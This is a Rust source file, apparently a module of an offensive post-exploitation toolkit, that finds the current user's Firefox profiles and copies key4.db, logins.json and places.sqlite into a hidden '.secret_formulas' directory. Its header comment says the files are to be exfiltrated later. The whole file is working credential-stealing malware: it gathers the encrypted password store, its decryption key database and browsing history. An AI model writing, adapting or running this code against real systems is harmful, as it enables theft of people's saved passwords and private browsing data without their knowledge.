/* Firefox credential Finder
 * Author: Chandler Hake    
 * Description: This module copies valuable Firefox files to a 
 * secret directory that will be exfilled at a later time
 * NOTE: If these 3 files are already in your secret directory
 * running this will overwrite them!!!
 * Supported Architectures: amd64
 * Supported Operating Systems: Linux
 */


// All modules must have a run function that returns a String.
// The returned String will be what is printed to the terminal
// when run. If your module does not perform any collection or
// has no need for printing anything, you can just return some
// String indicating termination, say "Done" for example.

// Run acts as a sort of 'main' for your module. It must always
// take in no parameters, it must be public, and it must return
// a String.

use std::io::Read;
use std::io::prelude::*;
use std::process::{Command};
use std::process::Stdio;  
use std::path::Path;
use scan_dir::ScanDir;


pub fn run() -> String {


    let mut keys_path: String;
    let mut logins_path: String;
    let mut places_path: String;
    let mut dir_list: Vec<String> = Vec::new();

    let path = Path::new("./.secret_formulas");

    if !path.exists(){
        Command::new("mkdir").args([".secret_formulas"]).status().unwrap();
    }

    let output = Command::new("whoami")
        .stdout(Stdio::piped())
        .output()
        .expect("Failed to identify User");
    let mut user = String::from_utf8_lossy(&output.stdout).into_owned();
    user.pop();
    println!("Current User: {}", user);

    let path_dir = "/home/".to_owned() + user.as_str() + "/.mozilla/firefox/";
    println!("Path: {}", path_dir);

    ScanDir::dirs().read(path_dir, |iter| {
        for (entry, name) in iter {
            dir_list.push(String::from(entry.path().as_path().to_string_lossy()));
        }
    }).unwrap();

    let ret = find_files(dir_list.clone(), "/key4.db");
    if ret == 1{
        return "Failed!".to_string();
    }
    let ret = find_files(dir_list.clone(), "/places.sqlite");
    if ret == 1{
        return "Failed!".to_string();
    }
    let ret = find_files(dir_list.clone(), "/logins.json");
    if ret == 1{
        return "Failed!".to_string();
    }    
	return "Success!".to_string();

}


fn find_files(dir_list: Vec<String>, loot_file: &str) -> u8{
    for dir in &dir_list{
        let mut dir_path = String::new();
        dir_path = dir.to_owned() + loot_file;
        let mut path = Path::new(&dir_path);
        if path.exists(){
            let logins_path = String::from(path.to_string_lossy());
            println!("{}", logins_path);
            let ret: u8 = copy_file(logins_path);
            return ret;
        }
    }
    return 1;
}


fn copy_file(loot_path: String) -> u8{
    let output = Command::new("cp")
        .args([loot_path , "./.secret_formulas/".to_string()])
        .stdout(Stdio::piped())
        .output()
        .expect("Failed to executed command");
    let trimmed = String::from_utf8_lossy(&output.stdout).into_owned();
    match trimmed.as_str(){
        "" => {
           return 0;
        }
        &_ => {
            return 1;
        }
    }
}

